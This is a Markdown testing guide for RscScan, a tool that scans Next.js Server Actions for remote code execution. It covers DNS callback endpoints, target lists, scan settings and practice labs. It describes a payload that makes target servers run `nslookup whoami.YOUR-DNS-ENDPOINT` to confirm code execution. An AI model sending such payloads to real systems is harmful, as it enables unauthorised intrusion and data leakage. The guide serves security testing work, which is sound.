# Testing Guide - RscScan

Complete guide for testing RscScan vulnerability scanner.

---

## 📋 Table of Contents

- [Quick Start](#quick-start)
- [Testing Environments](#testing-environments)
- [Setting Up DNS Exfiltration](#setting-up-dns-exfiltration)
- [Creating Target Lists](#creating-target-lists)
- [Running Scans](#running-scans)
- [Demo Mode](#demo-mode)
- [Interpreting Results](#interpreting-results)
- [Recommended Testing Labs](#recommended-testing-labs)
- [Unit Tests](#unit-tests)
- [Troubleshooting](#troubleshooting)

---

## Quick Start

### 1. Setup DNS Exfiltration Endpoint

Choose one of these services:

**Option A: Burp Collaborator (Recommended)**
- Open Burp Suite Professional
- Go to Burp → Burp Collaborator client
- Click "Copy to clipboard"
- Your endpoint: `abc123xyz.burpcollaborator.net`

**Option B: Interactsh (Free)**
- Visit https://app.interactsh.com
- Copy the generated domain
- Your endpoint: `abc123xyz.interact.sh`

### 2. Create Target List

Create a file `targets.txt`:
```text
https://your-lab-url.web-security-academy.net
http://localhost:3000
https://example-nextjs-app.com
```

### 3. Run Scanner

```bash
# Start the application
npm run electron:dev
```

### 4. Configure and Scan

1. Enter your DNS endpoint
2. Click "Select File" and choose `targets.txt`
3. Click "Start Scan"
4. Monitor progress and results

---

## Testing Environments

### Safe Testing Environments

#### 1. PortSwigger Web Security Academy ⭐⭐⭐⭐⭐
- **URL:** https://portswigger.net/web-security/all-labs
- **Cost:** Free
- **Legal:** 100% Legal
- **Features:**
  - Specialized Next.js labs
  - Isolated environment
  - No risk of legal issues
  - Detailed solutions provided

**How to Use:**
1. Create free account
2. Search for "Next.js" or "Server Actions" labs
3. Launch lab instance
4. Use provided URL as target
5. Use Burp Collaborator for DNS exfiltration

---

#### 2. Local Test Environment (Docker)

**Setup OWASP Juice Shop:**
```bash
# Pull and run
docker pull bkimminich/juice-shop
docker run -p 3000:3000 bkimminich/juice-shop

# Target URL
http://localhost:3000
```

**Setup Vulnerable Next.js App:**
```bash
# Clone vulnerable app
git clone https://github.com/example/vulnerable-nextjs-app
cd vulnerable-nextjs-app

# Install and run
npm install
npm run dev

# Target URL
http://localhost:3000
```

---

#### 3. HackTheBox
- **URL:** https://www.hackthebox.com/
- **Cost:** Free tier available, VIP for full access
- **Legal:** 100% Legal
- **Features:**
  - Real vulnerable machines
  - Node.js/Next.js challenges
  - Active community

---

### ⚠️ DO NOT TEST ON

- ❌ Production websites
- ❌ Sites you don't own
- ❌ Sites without written permission
- ❌ Government websites
- ❌ Financial institutions
- ❌ Healthcare systems

---

## Setting Up DNS Exfiltration

### What is DNS Exfiltration?

DNS exfiltration is a technique where data is sent via DNS queries. The scanner uses this to confirm if code execution occurred on the target server.

### How It Works

1. Scanner sends exploit payload
2. Payload executes `nslookup whoami.YOUR-DNS-ENDPOINT`
3. If vulnerable, server makes DNS query
4. Your DNS endpoint receives the query
5. Confirms vulnerability

### Setup Options

#### Option 1: Burp Collaborator (Professional)

**Advantages:**
- Most reliable
- Detailed interaction logs
- Built into Burp Suite
- Automatic polling

**Setup:**
```
1. Open Burp Suite Professional
2. Burp → Burp Collaborator client
3. Click "Copy to clipboard"
4. Paste into scanner DNS field
```

**Checking Results:**
```
1. Return to Burp Collaborator client
2. Click "Poll now"
3. Look for DNS interactions
4. Check for "whoami" in queries
```

---

#### Option 2: Interactsh (Free)

**Advantages:**
- Free
- No installation required
- Web-based interface
- Real-time notifications

**Setup:**
```
1. Visit https://app.interactsh.com
2. Copy generated domain (e.g., abc123.interact.sh)
3. Paste into scanner DNS field
```

**Checking Results:**
```
1. Keep Interactsh tab open
2. Interactions appear in real-time
3. Look for DNS queries
4. Check for "whoami" in queries
```

---

#### Option 3: Custom DNS Server (Advanced)

**Setup Your Own:**
```bash
# Install dnslog
npm install -g dnslog

# Run DNS server
dnslog --port 53 --domain yourdomain.com

# Use in scanner
yourdomain.com
```

---

## Creating Target Lists

### File Format

Create a plain text file with one URL per line:

```text
# targets.txt

# PortSwigger Labs
https://lab-id.web-security-academy.net

# Local Development
http://localhost:3000
http://localhost:3001

# Test Servers
https://staging.example.com
https://dev.example.com

# Comments are supported (lines starting with #)
```

### Best Practices

1. **One URL per line**
   ```text
   https://example.com
   https://test.example.com
   ```

2. **Include protocol**
   ```text
   ✅ https://example.com
   ❌ example.com
   ```

3. **Use full URLs**
   ```text
   ✅ https://example.com/api/action
   ❌ /api/action
   ```

4. **Group by environment**
   ```text
   # Production
   https://prod.example.com

   # Staging
   https://staging.example.com

   # Development
   http://localhost:3000
   ```

### Example Target Lists

**Minimal:**
```text
https://lab-id.web-security-academy.net
```

**Comprehensive:**
```text
# PortSwigger Labs
https://lab-1.web-security-academy.net
https://lab-2.web-security-academy.net

# Local Development
http://localhost:3000
http://localhost:3001
http://localhost:4000

# Staging Environment
https://staging-api.example.com
https://staging-app.example.com

# Test Servers
https://test1.example.com
https://test2.example.com
```

---

## Running Scans

### Step-by-Step Process

#### 1. Launch Application
```bash
npm run electron:dev
```

#### 2. Configure Scanner

**DNS Endpoint:**
- Enter your Burp Collaborator or Interactsh domain
- Example: `abc123.burpcollaborator.net`

**Target List:**
- Click "Select File"
- Choose your `targets.txt` file
- Or paste URLs directly (web mode)

#### 3. Start Scan

- Click "Start Scan" button
- Or press `Ctrl+Enter` (Windows/Linux)
- Or press `Cmd+Enter` (macOS)

#### 4. Monitor Progress

- **Progress Bar:** Shows completion percentage
- **Statistics:** Real-time vulnerable/safe/error counts
- **Results Table:** Live updates as scans complete

#### 5. Review Results

- **Vulnerable:** Red - Requires attention
- **Safe:** Green - No vulnerability detected
- **Error:** Yellow - Scan failed (network/timeout)

#### 6. Export Results

- Click "Export JSON" or "Export CSV"
- Or press `Ctrl+E` / `Cmd+E`
- Choose save location

---

### Scan Configuration

#### Settings Modal

Access via Settings button or `Ctrl+,` / `Cmd+,`

**Request Timeout:**
- Default: 10 seconds
- Range: 1-60 seconds
- Increase for slow servers

**Max Concurrent Requests:**
- Default: 30
- Range: 1-100
- Decrease for resource-constrained systems

**Export Format:**
- JSON: Machine-readable, preserves structure
- CSV: Human-readable, Excel-compatible

---

## Demo Mode

### What is Demo Mode?

Demo mode simulates scanning without making real network requests. Perfect for:
- UI testing
- Feature demonstration
- Training
- Screenshots

### Enable Demo Mode

1. Click Demo Mode toggle in header
2. Or check "Demo Mode" in Settings

### How It Works

- Generates random results
- Simulates network delays
- No actual HTTP requests
- Safe for any environment

### Example Output

```
✅ https://example.com - Safe (200)
❌ https://test.com - Vulnerable (200) - Headers: x-action, rsc
⚠️ https://error.com - Error (ECONNREFUSED)
```

---

## Interpreting Results

### Result Status Types

#### Vulnerable ❌
```
Status: vulnerable
Status Code: 200
Message: Vulnerability indicators found: x-action, next-action, rsc
```

**Meaning:**
- Target responded with vulnerability indicators
- Server likely running Next.js Server Actions
- Potential RCE vulnerability present

**Next Steps:**
1. Verify with manual testing
2. Check DNS exfiltration logs
3. Report to security team
4. Apply patches

---

#### Safe ✅
```
Status: safe
Status Code: 200
Message: No vulnerability indicators detected
```

**Meaning:**
- No vulnerability indicators found
- Target may not use Next.js Server Actions
- Or vulnerability is patched

**Next Steps:**
1. Verify target is actually Next.js
2. Check if Server Actions are used
3. Consider false negative possibility

---

#### Error ⚠️
```
Status: error
Status Code: N/A
Message: ECONNREFUSED - Connection refused
```

**Common Errors:**

**ECONNREFUSED:**
- Server not running
- Wrong URL
- Firewall blocking

**ETIMEDOUT:**
- Server too slow
- Network issues
- Increase timeout in settings

**CORS Error:**
- Web mode limitation
- Use Electron mode instead

**SSL Error:**
- Invalid certificate
- Self-signed certificate
- Use HTTP for testing

---

### Understanding Headers

**Vulnerability Indicators:**
- `x-action` - Custom action header
- `next-action` - Next.js action header
- `rsc` - React Server Components header

**Example Response:**
```
Headers:
  x-action: "1234567890"
  next-action: "abcdef123456"
  rsc: "1"
```

**Interpretation:**
- All three headers present = High confidence
- Two headers = Medium confidence
- One header = Low confidence (investigate further)

---

## Recommended Testing Labs

### 1. PortSwigger Web Security Academy

**Best For:** Beginners and professionals

**Features:**
- Free access
- Guided labs
- Detailed solutions
- Safe environment

**How to Use:**
1. Create account at https://portswigger.net/web-security
2. Search for "Next.js" or "Prototype Pollution" labs
3. Launch lab instance
4. Use provided URL in scanner
5. Follow lab instructions

**Example Labs:**
- "Next.js Server Actions RCE"
- "Prototype Pollution to RCE"
- "Server-Side Prototype Pollution"

---

### 2. HackTheBox

**Best For:** Intermediate to advanced

**Features:**
- Real vulnerable machines
- Active community
- Writeups available
- Points and rankings

**How to Use:**
1. Sign up at https://www.hackthebox.com
2. Connect to VPN
3. Find Next.js/Node.js machines
4. Scan with RscScan
5. Complete challenges

---

### 3. TryHackMe

**Best For:** Beginners

**Features:**
- Guided learning paths
- Browser-based labs
- No VPN required
- Free tier available

**How to Use:**
1. Sign up at https://tryhackme.com
2. Search for "Next.js" or "Node.js" rooms
3. Start machine
4. Use provided IP in scanner

---

## Unit Tests

### Running Tests

```bash
# Run all tests
npm test

# Run tests in watch mode
npm test -- --watch

# Run tests with UI
npm run test:ui

# Generate coverage report
npm run test:coverage
```

### Test Files

```
src/tests/
├── scanner.test.js        # Scanner service tests
├── fileHandler.test.js    # File handler tests
├── useScanner.test.js     # Scanner hook tests
└── setup.js               # Test configuration
```

### Writing Tests

Example test:
```javascript
import { describe, it, expect } from 'vitest';
import { buildPayload } from '../services/scanner';

describe('Scanner Service', () => {
    it('should build valid payload', () => {
        const payload = buildPayload('test.burpcollaborator.net');
        expect(payload).toContain('test.burpcollaborator.net');
    });
});
```

---

## Troubleshooting

### Common Issues

#### 1. "No passive sources are enabled"

**Problem:** No targets loaded

**Solution:**
- Load target file
- Or paste URLs in web mode

---

#### 2. All Results Show "Error"

**Problem:** Network/connectivity issues

**Solution:**
- Check internet connection
- Verify target URLs are accessible
- Try increasing timeout in settings
- Use demo mode to test UI

---

#### 3. "CORS Error" in Web Mode

**Problem:** Browser CORS restrictions

**Solution:**
- Use Electron mode instead
- Or setup CORS proxy

---

#### 4. No DNS Interactions Received

**Problem:** Payload not executing or DNS endpoint incorrect

**Solution:**
- Verify DNS endpoint is correct
- Check target is actually vulnerable
- Try different DNS service
- Check firewall settings

---

#### 5. Scan Hangs/Freezes

**Problem:** Too many concurrent requests

**Solution:**
- Reduce concurrent requests in settings
- Close other applications
- Restart scanner

---

### Debug Mode

Enable verbose logging:

```bash
# Set environment variable
export DEBUG=rscscan:*

# Run scanner
npm run electron:dev
```

Check logs in:
- **Electron:** DevTools Console
- **Web:** Browser Console

---

## Best Practices

### 1. Always Get Permission
- Written authorization required
- Document scope of testing
- Follow responsible disclosure

### 2. Use Safe Environments
- Prefer testing labs
- Use local/staging environments
- Never test production without permission

### 3. Verify Results
- Check DNS exfiltration logs
- Manual verification recommended
- Consider false positives

### 4. Document Findings
- Export results
- Take screenshots
- Note timestamps
- Record DNS interactions

### 5. Report Responsibly
- Follow disclosure policy
- Allow time for fixes
- Don't publish exploits publicly

---

## Support

Need help with testing?

1. Check [Troubleshooting](#troubleshooting)
2. Review [GitHub Issues](https://github.com/VeilVulp/Rscscan/issues)
3. Join community discussions
4. Contact support: veilvulp@outlook.com

---

<div align="center">

**Happy Testing!** 🧪

[⬆ Back to Top](#testing-guide---rscscan)

</div>
